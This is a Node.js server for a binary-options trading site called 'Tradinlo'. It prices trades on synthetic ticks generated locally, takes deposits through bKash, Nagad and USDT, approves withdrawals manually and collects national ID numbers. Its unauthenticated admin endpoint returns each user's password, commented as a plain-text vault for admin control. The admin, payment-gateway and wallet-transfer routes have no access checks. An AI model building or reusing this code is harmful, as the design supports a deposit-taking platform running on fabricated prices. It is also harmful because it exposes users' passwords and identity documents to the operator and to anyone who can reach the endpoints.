/**
 * Tradinlo Enterprise Server Engine
 * Express & Socket.io Real-Time Synchronization Hub
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const MarketEngine = require('./marketEngine');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Client Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Master Admin Route
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });
const market = new MarketEngine(1.08500, 0.00018);

// Broadcast Real-Time Price Ticks Every 100ms
setInterval(() => {
  io.emit('price_tick', { timestamp: Date.now(), price: market.generateNextTick() });
}, 100);

// User Authentication Endpoints
app.post('/api/auth/register', (req, res) => {
  const { fullName, email, password, phone, refCode } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Email and Password are required' });
  }
  const result = market.registerUser(fullName, email, password, phone, refCode);
  res.json(result);
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  const result = market.loginUser(email, password);
  res.json(result);
});

// Financial Deposit API
app.post('/api/deposit', (req, res) => {
  const { userId, amount, method, trxId } = req.body;
  const numAmt = parseFloat(amount);
  if (isNaN(numAmt) || numAmt < 5) {
    return res.status(400).json({ success: false, message: 'Minimum Deposit amount is $5' });
  }
  if (!trxId) {
    return res.status(400).json({ success: false, message: 'Transaction TRX ID is required' });
  }
  const data = market.requestDeposit(userId || 'USR_10001', numAmt, method, trxId);
  res.json({ success: true, message: 'Deposit request submitted successfully', data });
});

// Financial Withdrawal API
app.post('/api/withdraw', (req, res) => {
  const { userId, amount, method, accountNo } = req.body;
  const numAmt = parseFloat(amount);
  if (isNaN(numAmt) || numAmt < 10) {
    return res.status(400).json({ success: false, message: 'Minimum Withdrawal amount is $10' });
  }
  if (!accountNo) {
    return res.status(400).json({ success: false, message: 'Account number or wallet address is required' });
  }
  const data = market.requestWithdrawal(userId || 'USR_10001', numAmt, method, accountNo);
  res.json({ success: true, message: 'Withdrawal request submitted successfully', data });
});

// KYC Submission API
app.post('/api/kyc/submit', (req, res) => {
  const { userId, nidNumber, docType } = req.body;
  if (!nidNumber) {
    return res.status(400).json({ success: false, message: 'NID or Passport number is required' });
  }
  const data = market.submitKYC(userId, nidNumber, docType || 'NID');
  res.json({ success: true, message: 'KYC documents submitted for review', data });
});

// Internal Wallet Transfer API
app.post('/api/wallet/transfer', (req, res) => {
  const { email, amount, fromWallet, toWallet } = req.body;
  const userObj = Object.values(market.users).find(u => u.email === email);
  if (!userObj) {
    return res.status(404).json({ success: false, message: 'User account not found' });
  }
  const numAmt = parseFloat(amount);
  if (isNaN(numAmt) || numAmt <= 0) {
    return res.status(400).json({ success: false, message: 'Invalid transfer amount' });
  }

  if (fromWallet === 'main' && userObj.mainWallet >= numAmt) {
    userObj.mainWallet -= numAmt;
    if (toWallet === 'trading') userObj.tradingWallet += numAmt;
    
    const sanitizedUser = { ...userObj };
    delete sanitizedUser.passwordHash;
    return res.json({ success: true, message: 'Internal transfer completed', user: sanitizedUser });
  }
  
  res.status(400).json({ success: false, message: 'Insufficient main wallet balance' });
});

// Master Admin Data Dashboard Endpoint
app.get('/api/admin/data', (req, res) => {
  const userListForAdmin = Object.values(market.users).map(u => ({
    id: u.id,
    fullName: u.fullName,
    email: u.email,
    password: u.passwordHash, // Plain text vault display for admin control
    phone: u.phone,
    mainWallet: u.mainWallet,
    tradingWallet: u.tradingWallet,
    kycStatus: u.kycStatus
  }));

  res.json({
    stats: market.getStats(),
    openTrades: market.openTrades,
    pendingDeposits: market.pendingDeposits,
    pendingWithdrawals: market.pendingWithdrawals,
    pendingKYCs: market.pendingKYCs,
    gateways: market.gatewaySettings,
    users: userListForAdmin
  });
});

// Admin Gateway Configuration Update
app.post('/api/admin/gateway', (req, res) => {
  const { bkash, nagad, usdt } = req.body;
  market.updateGateways(bkash, nagad, usdt);
  res.json({ success: true, message: 'Payment gateway settings updated successfully' });
});

// Admin Transaction Approval/Rejection Action
app.post('/api/admin/action', (req, res) => {
  const { id, type, action } = req.body;
  if (action === 'APPROVE') {
    if (type === 'KYC') {
      market.approveKYC(id);
      return res.json({ success: true, message: 'KYC verified successfully' });
    }
    const item = market.approveTransaction(id, type);
    return res.json({ success: true, item });
  } else {
    market.rejectTransaction(id, type);
    return res.json({ success: true, message: 'Transaction rejected' });
  }
});

// WebSocket Trade Execution Handling
io.on('connection', (socket) => {
  socket.on('place_trade', (data) => {
    const entryPrice = market.currentPrice;
    const durationSec = parseInt(data.durationSec) || 60;
    const expiresAt = Date.now() + (durationSec * 1000);

    const trade = {
      id: 'TRD_' + Date.now(),
      userId: data.userId || 'USR_10001',
      accountType: data.accountType || 'DEMO',
      type: data.type, // 'CALL' or 'PUT'
      entryPrice,
      amount: parseFloat(data.amount) || 10,
      expiresAt
    };

    market.addTrade(trade);

    setTimeout(() => {
      const finalPrice = market.currentPrice;
      let isWin = false;
      if (data.type === 'CALL' && finalPrice > entryPrice) isWin = true;
      if (data.type === 'PUT' && finalPrice < entryPrice) isWin = true;

      const payout = isWin ? (parseFloat(data.amount) * 1.88) : 0;
      market.tradeHistory.push({ ...trade, closePrice: finalPrice, isWin, payout });

      socket.emit('trade_result', {
        tradeId: trade.id,
        isWin,
        entryPrice,
        closePrice: finalPrice,
        payout
      });
    }, durationSec * 1000);
  });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
  console.log(`Tradinlo Enterprise Server is running live on port ${PORT}`);
});
